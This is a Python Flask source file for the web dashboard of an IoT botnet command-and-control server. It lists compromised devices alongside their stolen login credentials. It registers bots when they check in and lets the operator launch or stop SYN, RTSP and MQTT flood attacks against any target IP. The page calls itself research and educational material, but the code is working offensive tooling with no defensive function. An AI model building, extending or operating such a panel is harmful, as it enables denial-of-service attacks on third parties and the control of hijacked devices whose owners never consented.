# C2 server web interface
from flask import render_template_string, jsonify, request
import logging
import json
from datetime import datetime

# Enhanced HTML template for web interface with modern styling and interactivity
HTML_TEMPLATE = '''
<!DOCTYPE html>
<html>
<head>
    <title>IoT C2 Research Panel</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
            margin: 0; 
            padding: 0; 
            background-color: #f5f5f5; 
            color: #333;
        }
        .container { 
            max-width: 1400px; 
            margin: 0 auto; 
            background: white; 
            border-radius: 8px; 
            box-shadow: 0 2px 10px rgba(0,0,0,0.1); 
            overflow: hidden;
            margin-top: 20px;
            margin-bottom: 20px;
        }
        .header { 
            background: linear-gradient(135deg, #1a237e 0%, #283593 100%); 
            color: white; 
            padding: 20px; 
            text-align: center; 
        }
        .header h1 { 
            margin: 0; 
            font-size: 28px; 
            font-weight: 600;
        }
        .header p {
            margin: 5px 0 0;
            opacity: 0.8;
            font-size: 14px;
        }
        .stats { 
            display: flex; 
            background: #f8f9fa; 
            border-bottom: 1px solid #dee2e6; 
            flex-wrap: wrap;
        }
        .stat-box { 
            flex: 1; 
            min-width: 200px;
            padding: 20px; 
            text-align: center; 
            border-right: 1px solid #dee2e6; 
            transition: all 0.3s ease;
        }
        .stat-box:hover {
            background-color: #e9ecef;
        }
        .stat-box:last-child { 
            border-right: none; 
        }
        .stat-number { 
            font-size: 32px; 
            font-weight: bold; 
            color: #1a237e; 
            margin-bottom: 5px;
        }
        .stat-label { 
            font-size: 14px; 
            color: #6c757d; 
            text-transform: uppercase; 
            letter-spacing: 1px;
        }
        .section { 
            margin: 20px; 
            background: white; 
            border-radius: 6px; 
            overflow: hidden; 
            border: 1px solid #dee2e6;
            margin-bottom: 30px;
        }
        .section-header { 
            background: #f8f9fa; 
            padding: 15px 20px; 
            border-bottom: 1px solid #dee2e6; 
            font-weight: 600; 
            font-size: 18px; 
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .section-controls {
            display: flex;
            gap: 10px;
        }
        table { 
            width: 100%; 
            border-collapse: collapse; 
        }
        th, td { 
            padding: 12px 16px; 
            text-align: left; 
            border-bottom: 1px solid #f1f3f4; 
        }
        tr:hover {
            background-color: #f8f9fa;
        }
        th { 
            background-color: #f8f9fa; 
            font-weight: 600; 
            font-size: 14px; 
            color: #495057; 
            position: sticky;
            top: 0;
        }
        td { 
            font-size: 14px; 
        }
        .status-indicator {
            display: inline-block;
            width: 10px;
            height: 10px;
            border-radius: 50%;
            margin-right: 6px;
        }
        .status-online .status-indicator { 
            background-color: #28a745;
        }
        .status-offline .status-indicator {
            background-color: #dc3545;
        }
        .status-online { 
            background: #d4edda; 
            color: #155724; 
            padding: 4px 12px; 
            border-radius: 12px; 
            font-size: 12px; 
            font-weight: 500; 
        }        .status-offline {
            background: #f8d7da;
            color: #721c24;
            padding: 4px 12px;
            border-radius: 12px;
            font-size: 12px;
            font-weight: 500;
        }
        .device-type {
            padding: 4px 12px;
            border-radius: 12px;
            font-size: 12px;
            font-weight: 500;
            text-transform: capitalize;
        }
        .device-type.camera {
            background: #e6f7ff;
            color: #0070f3;
        }
        .device-type.router {
            background: #fff0f6;
            color: #eb2f96;
        }
        .device-type.dvr {
            background: #f6ffed;
            color: #52c41a;
        }
        .device-type.iot {
            background: #fffbe6;
            color: #faad14;
        }
        .device-type.unknown {
            background: #f5f5f5;
            color: #8c8c8c;
        }
        .btn { 
            padding: 8px 16px; 
            margin: 2px; 
            border: none; 
            border-radius: 4px; 
            cursor: pointer; 
            font-size: 13px; 
            font-weight: 500; 
            transition: all 0.2s; 
            display: inline-flex;
            align-items: center;
            justify-content: center;
        }
        .btn-attack { 
            background: #dc3545; 
            color: white; 
        }
        .btn-attack:hover { 
            background: #c82333; 
        }
        .btn-stop { 
            background: #6c757d; 
            color: white; 
        }
        .btn-stop:hover { 
            background: #5a6268; 
        }
        .btn-refresh {
            background: #007bff;
            color: white;
        }
        .btn-refresh:hover {
            background: #0069d9;
        }
        .btn-bulk { 
            background: #007bff; 
            color: white; 
            padding: 10px 20px;
            font-size: 14px;
        }
        .btn-bulk:hover { 
            background: #0069d9; 
        }
        .btn-disabled {
            background: #e9ecef;
            color: #adb5bd;
            cursor: not-allowed;
        }
        .btn-icon {
            margin-right: 5px;
        }
        .footer {
            text-align: center;
            padding: 20px;
            color: #6c757d;
            font-size: 12px;
            border-top: 1px solid #dee2e6;
        }
        .modal {
            display: none;
            position: fixed;
            z-index: 1000;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0,0,0,0.5);
        }
        .modal-content {
            background-color: #fefefe;
            margin: 10% auto;
            padding: 20px;
            border-radius: 8px;
            max-width: 500px;
            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
        }
        .modal-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 1px solid #dee2e6;
            padding-bottom: 10px;
            margin-bottom: 20px;
        }
        .modal-title {
            font-size: 20px;
            font-weight: 600;
        }
        .close {
            color: #aaa;
            font-size: 28px;
            font-weight: bold;
            cursor: pointer;
        }
        .close:hover {
            color: black;
        }
        .form-group {
            margin-bottom: 15px;
        }
        .form-group label {
            display: block;
            margin-bottom: 5px;
            font-weight: 500;
        }
        .form-control {
            width: 100%;
            padding: 8px 12px;
            border: 1px solid #ced4da;
            border-radius: 4px;
            font-size: 14px;
        }
        .modal-footer {
            padding-top: 15px;
            border-top: 1px solid #dee2e6;
            text-align: right;
        }
        .badge {
            display: inline-block;
            padding: 3px 8px;
            border-radius: 10px;
            font-size: 12px;
            font-weight: 500;
        }
        .badge-primary {
            background-color: #007bff;
            color: white;
        }
        .badge-secondary {
            background-color: #6c757d;
            color: white;
        }
        .badge-success {
            background-color: #28a745;
            color: white;
        }
        .badge-danger {
            background-color: #dc3545;
            color: white;
        }
        .badge-warning {
            background-color: #ffc107;
            color: #212529;
        }
        .badge-info {
            background-color: #17a2b8;
            color: white;
        }
        .no-data {
            padding: 30px;
            text-align: center;
            color: #6c757d;
        }
        @media (max-width: 768px) {
            .stat-box {
                min-width: 50%;
            }
            .btn {
                padding: 6px 10px;
                font-size: 12px;
            }
            th, td {
                padding: 8px 10px;
                font-size: 13px;
            }
            .section-header {
                flex-direction: column;
                align-items: flex-start;
                gap: 10px;
            }
            .section-controls {
                width: 100%;
                justify-content: flex-start;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>IoT C2 Research Dashboard</h1>
            <p>Monitoring and Control Panel for IoT Security Research</p>
        </div>
        
        <div class="stats">
            <div class="stat-box">
                <div class="stat-number">{{ compromised_count }}</div>
                <div class="stat-label">Compromised Devices</div>
            </div>
            <div class="stat-box">
                <div class="stat-number">{{ online_count }}</div>
                <div class="stat-label">Online Devices</div>
            </div>
            <div class="stat-box">
                <div class="stat-number">{{ scan_count }}</div>
                <div class="stat-label">Scan Results</div>
            </div>
            <div class="stat-box">
                <div class="stat-number">{{ active_sessions }}</div>
                <div class="stat-label">Active Attacks</div>
            </div>
        </div>
        
        <div class="section">
            <div class="section-header">
                <span>Compromised Devices</span>
                <div class="section-controls">
                    <button class="btn btn-refresh" onclick="refreshData('devices')">
                        <span class="btn-icon">⟳</span> Refresh
                    </button>
                    <button class="btn btn-bulk" onclick="openAttackModal()" {{ 'disabled class="btn-disabled"' if online_count == 0 else '' }}>
                        <span class="btn-icon">⚡</span> Start Bulk Attack
                    </button>
                    <button class="btn btn-stop" onclick="stopAllAttacks()" {{ 'disabled class="btn-disabled"' if active_sessions == 0 else '' }}>
                        <span class="btn-icon">⏹</span> Stop All Attacks
                    </button>
                </div>
            </div>
            <div class="section-body">
                {% if compromised_devices %}
                <table>
                    <thead>
                        <tr>                            <th>IP Address</th>
                            <th>Username</th>
                            <th>Password</th>
                            <th>Status</th>
                            <th>Device Type</th>
                            <th>Last Seen</th>
                            <th>Actions</th>
                        </tr>
                    </thead>
                    <tbody>
                        {% for device in compromised_devices %}
                        <tr>
                            <td>{{ device.ip }}</td>
                            <td>{{ device.username }}</td>
                            <td>{{ device.password }}</td>
                            <td>
                                <span class="status-{{ device.status.lower() }}">
                                    <span class="status-indicator"></span>                                    {{ device.status }}
                                </span>
                            </td>
                            <td>
                                <span class="device-type {{ device.device_type|default('unknown', true) }}">
                                    {{ device.device_type|default('unknown', true) }}
                                </span>
                            </td>
                            <td>{{ device.last_seen }}</td>
                            <td>
                                <button class="btn btn-attack" onclick="startAttack('{{ device.ip }}')" {{ 'disabled class="btn-disabled"' if device.status.lower() != 'online' else '' }}>
                                    Attack
                                </button>
                                <button class="btn btn-stop" onclick="stopAttack('{{ device.ip }}')" {{ 'disabled class="btn-disabled"' if device.ip not in active_ips else '' }}>
                                    Stop
                                </button>
                            </td>
                        </tr>
                        {% endfor %}
                    </tbody>
                </table>
                {% else %}
                <div class="no-data">
                    <p>No compromised devices found. Run the exploit script to compromise devices.</p>
                </div>
                {% endif %}
            </div>
        </div>
        
        <div class="section">
            <div class="section-header">
                <span>Recent Network Scan Results</span>
                <div class="section-controls">
                    <button class="btn btn-refresh" onclick="refreshData('scans')">
                        <span class="btn-icon">⟳</span> Refresh
                    </button>
                </div>
            </div>
            <div class="section-body">
                {% if scan_results %}
                <table>
                    <thead>
                        <tr>
                            <th>IP Address</th>
                            <th>Port</th>
                            <th>Service</th>
                            <th>Timestamp</th>
                            <th>Status</th>
                        </tr>
                    </thead>
                    <tbody>
                        {% for scan in scan_results %}
                        <tr>
                            <td>{{ scan.ip }}</td>
                            <td>{{ scan.port }}</td>
                            <td>{{ scan.service }}</td>
                            <td>{{ scan.timestamp }}</td>
                            <td>
                                {% if scan.ip in compromised_ips %}
                                <span class="badge badge-success">Compromised</span>
                                {% else %}
                                <span class="badge badge-warning">Vulnerable</span>
                                {% endif %}
                            </td>
                        </tr>
                        {% endfor %}
                    </tbody>
                </table>
                {% else %}
                <div class="no-data">
                    <p>No scan results available. Run the exploit script to scan the network.</p>
                </div>
                {% endif %}
            </div>
        </div>
        
        <div class="section">
            <div class="section-header">
                <span>Active Attacks</span>
                <div class="section-controls">
                    <button class="btn btn-refresh" onclick="refreshData('attacks')">
                        <span class="btn-icon">⟳</span> Refresh
                    </button>
                </div>
            </div>
            <div class="section-body">
                {% if active_attacks %}
                <table>
                    <thead>
                        <tr>
                            <th>Bot IP</th>
                            <th>Target</th>
                            <th>Attack Type</th>
                            <th>Start Time</th>
                            <th>Duration</th>
                            <th>Actions</th>
                        </tr>
                    </thead>
                    <tbody>
                        {% for ip, attack in active_attacks.items() %}
                        <tr>
                            <td>{{ ip }}</td>
                            <td>{{ attack.target }}</td>
                            <td>
                                <span class="badge badge-danger">{{ attack.type }}</span>
                            </td>
                            <td>{{ attack.start_time }}</td>
                            <td>{{ attack.duration }}</td>
                            <td>
                                <button class="btn btn-stop" onclick="stopAttack('{{ ip }}')">
                                    Stop
                                </button>
                            </td>
                        </tr>
                        {% endfor %}
                    </tbody>
                </table>
                {% else %}
                <div class="no-data">
                    <p>No active attacks running.</p>
                </div>
                {% endif %}
            </div>
        </div>
        
        <div class="footer">
            <p>IoT Security Research Platform - For Educational Purposes Only</p>
        </div>
    </div>
    
    <!-- Attack Modal -->
    <div id="attackModal" class="modal">
        <div class="modal-content">
            <div class="modal-header">
                <h2 class="modal-title">Start Bulk Attack</h2>
                <span class="close" onclick="closeModal()">&times;</span>
            </div>
            <div class="modal-body">
                <div class="form-group">
                    <label for="targetIp">Target IP:</label>
                    <input type="text" id="targetIp" class="form-control" placeholder="Enter target IP address">
                </div>
                <div class="form-group">
                    <label for="attackType">Attack Type:</label>
                    <select id="attackType" class="form-control">
                        <option value="syn">SYN Flood (Port 80)</option>
                        <option value="rtsp">RTSP Flood (Port 554)</option>
                        <option value="mqtt">MQTT Flood (Port 1883)</option>
                    </select>
                </div>
            </div>
            <div class="modal-footer">
                <button class="btn btn-stop" onclick="closeModal()">Cancel</button>
                <button class="btn btn-attack" onclick="startBulkAttack()">Start Attack</button>
            </div>
        </div>
    </div>
    
    <script>
        // Helper functions for modal
        function openAttackModal() {
            document.getElementById('attackModal').style.display = 'block';
        }
        
        function closeModal() {
            document.getElementById('attackModal').style.display = 'none';
        }
        
        // When the user clicks anywhere outside of the modal, close it
        window.onclick = function(event) {
            var modal = document.getElementById('attackModal');
            if (event.target == modal) {
                closeModal();
            }
        }
        
        // Attack functions
        function startAttack(botIp) {
            openAttackModal();
            // We'll set the bot IP when the form is submitted
            window.selectedBotIp = botIp;
        }
        
        function startBulkAttack() {
            var targetIp = document.getElementById('targetIp').value;
            var attackType = document.getElementById('attackType').value;
            
            if (!targetIp) {
                alert('Please enter a target IP address');
                return;
            }
            
            var endpoint = '/start-telnet-ddos';
            var data = {
                target: targetIp,
                attack_type: attackType
            };
            
            // If we have a specific bot selected, use the single attack endpoint
            if (window.selectedBotIp) {
                endpoint = '/start-attack';
                data.bot_ip = window.selectedBotIp;
            }
            
            fetch(endpoint, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(data)
            })
            .then(response => response.json())
            .then(data => {
                if (data.status === 'success') {
                    alert(data.message);
                    closeModal();
                    refreshData('all');
                } else {
                    alert('Error: ' + (data.error || 'Unknown error'));
                }
            })
            .catch(error => {
                console.error('Error:', error);
                alert('Error starting attack: ' + error);
            });
            
            // Clear the selected bot
            window.selectedBotIp = null;
        }
        
        function stopAttack(botIp) {
            fetch('/stop-attack', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    bot_ip: botIp
                })
            })
            .then(response => response.json())
            .then(data => {
                alert(data.message);
                refreshData('attacks');
            })
            .catch(error => {
                console.error('Error:', error);
                alert('Error stopping attack: ' + error);
            });
        }
        
        function stopAllAttacks() {
            fetch('/stop-telnet-ddos', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                }
            })
            .then(response => response.json())
            .then(data => {
                alert(data.message);
                refreshData('all');
            })
            .catch(error => {
                console.error('Error:', error);
                alert('Error stopping attacks: ' + error);
            });
        }
          function refreshData(section) {
            if (section === 'attacks' || section === 'all') {
                refreshActiveAttacks();
            }
            if (section === 'all') {
                // For full refresh, reload the page
                location.reload();
            }
        }
        
        function refreshActiveAttacks() {
            fetch('/get-active-attacks')
                .then(response => response.json())
                .then(data => {
                    updateActiveAttacksTable(data.active_attacks);
                })
                .catch(error => {
                    console.error('Error refreshing active attacks:', error);
                });
        }
        
        function updateActiveAttacksTable(activeAttacks) {
            const tableBody = document.querySelector('.section:has(.section-header span:contains("Active Attacks")) tbody');
            if (!tableBody) return;
            
            // Clear existing rows
            tableBody.innerHTML = '';
            
            if (Object.keys(activeAttacks).length === 0) {
                const noDataDiv = document.querySelector('.section:has(.section-header span:contains("Active Attacks")) .section-body');
                if (noDataDiv) {
                    noDataDiv.innerHTML = '<div class="no-data"><p>No active attacks running.</p></div>';
                }
                return;
            }
            
            // Add new rows
            Object.entries(activeAttacks).forEach(([ip, attack]) => {
                const row = document.createElement('tr');
                
                // Calculate duration
                const durationSeconds = attack.duration_seconds;
                let duration;
                if (durationSeconds < 60) {
                    duration = `${Math.floor(durationSeconds)} seconds`;
                } else if (durationSeconds < 3600) {
                    duration = `${Math.floor(durationSeconds / 60)} minutes`;
                } else {
                    duration = `${Math.floor(durationSeconds / 3600)} hours`;
                }
                
                row.innerHTML = `
                    <td>${ip}</td>
                    <td>${attack.target}</td>
                    <td><span class="badge badge-danger">${attack.type}</span></td>
                    <td>${new Date(attack.start_time).toLocaleString()}</td>
                    <td>${duration}</td>
                    <td>
                        <button class="btn btn-stop" onclick="stopAttack('${ip}')">
                            Stop
                        </button>
                    </td>
                `;
                tableBody.appendChild(row);
            });
        }
        
        // Auto-refresh active attacks every 5 seconds
        setInterval(refreshActiveAttacks, 5000);
    </script>
</body>
</html>
'''

def handle_bot_checkin(db_manager, data):
    """Handle bot checkin and registration"""
    try:
        if not data:
            logging.error("Empty data received in bot checkin")
            return jsonify({'error': 'No data provided'}), 400
            
        ip = data.get('ip')
        username = data.get('username')
        password = data.get('password')
        status = data.get('status', 'online')
        device_type = data.get('device_type', 'unknown')
        
        logging.info(f"Bot checkin attempt: IP={ip}, Username={username}, Status={status}, Type={device_type}")
        
        if not all([ip, username, password]):
            missing_fields = []
            if not ip: missing_fields.append('ip')
            if not username: missing_fields.append('username')
            if not password: missing_fields.append('password')
            
            error_msg = f"Missing required data in bot checkin: {missing_fields}"
            logging.error(error_msg)
            return jsonify({'error': error_msg}), 400
            
        # Validate IP format (basic validation)
        import re
        if not re.match(r'^(\d{1,3}\.){3}\d{1,3}$', ip):
            logging.error(f"Invalid IP format: {ip}")
            return jsonify({'error': f'Invalid IP format: {ip}'}), 400
            
        # Register the device in the database with detailed logging
        logging.info(f"Attempting to register device {ip} in database...")
        success = db_manager.register_device(ip, username, password, device_type)
        
        if not success:
            error_msg = f"Database registration failed for device {ip}"
            logging.error(error_msg)
            return jsonify({'error': error_msg}), 500
            
        logging.info(f"[SUCCESS] Device {ip} registered successfully with type {device_type}")
        return jsonify({
            'status': 'success',
            'message': f'Device {ip} registered successfully',
            'device_type': device_type,
            'registered_c2': True,
            'timestamp': data.get('timestamp')
        })
        
    except Exception as e:
        error_msg = f"Error in bot checkin: {str(e)}"
        logging.error(error_msg)
        return jsonify({'error': error_msg}), 500

def render_dashboard(devices, scan_results, active_sessions, active_attacks=None):
    """Render the dashboard with the provided data"""
    try:
        # Calculate statistics
        compromised_count = len(devices)
        online_count = sum(1 for device in devices if device.get('status', '').lower() == 'online')
        scan_count = len(scan_results)
        
        # Format dates for better readability
        for device in devices:
            if 'last_seen' in device and device['last_seen']:
                try:
                    # Try to parse the timestamp
                    if isinstance(device['last_seen'], str):
                        timestamp = datetime.fromisoformat(device['last_seen'].replace('Z', '+00:00'))
                        device['last_seen'] = timestamp.strftime('%Y-%m-%d %H:%M:%S')
                except Exception:
                    # If parsing fails, leave it as is
                    pass
        
        for scan in scan_results:
            if 'timestamp' in scan and scan['timestamp']:
                try:
                    # Try to parse the timestamp
                    if isinstance(scan['timestamp'], str):
                        timestamp = datetime.fromisoformat(scan['timestamp'].replace('Z', '+00:00'))
                        scan['timestamp'] = timestamp.strftime('%Y-%m-%d %H:%M:%S')
                except Exception:
                    # If parsing fails, leave it as is
                    pass
        
        # Get list of compromised IPs for highlighting scan results
        compromised_ips = [device.get('ip') for device in devices]
        
        # Get list of active attack IPs for UI controls
        active_ips = []
        if active_attacks:
            active_ips = list(active_attacks.keys())
            
            # Calculate attack duration
            now = datetime.now()
            for ip, attack in active_attacks.items():
                start_time = attack['start_time']
                if isinstance(start_time, str):
                    try:
                        start_time = datetime.fromisoformat(start_time.replace('Z', '+00:00'))
                    except:
                        start_time = datetime.now()  # Fallback
                
                # Calculate duration
                duration_seconds = (now - start_time).total_seconds()
                if duration_seconds < 60:
                    attack['duration'] = f"{int(duration_seconds)} seconds"
                elif duration_seconds < 3600:
                    attack['duration'] = f"{int(duration_seconds / 60)} minutes"
                else:
                    attack['duration'] = f"{int(duration_seconds / 3600)} hours"
                
                # Format start time for display
                attack['start_time'] = start_time.strftime('%Y-%m-%d %H:%M:%S')
        else:
            active_attacks = {}
        
        # Render the template with the data
        return render_template_string(
            HTML_TEMPLATE,
            compromised_devices=devices,
            scan_results=scan_results,
            active_sessions=active_sessions,
            compromised_count=compromised_count,
            online_count=online_count,
            scan_count=scan_count,
            compromised_ips=compromised_ips,
            active_attacks=active_attacks,
            active_ips=active_ips
        )
        
    except Exception as e:
        logging.error(f"Error rendering dashboard: {e}")
        return f"<h1>Error rendering dashboard</h1><p>{str(e)}</p>"
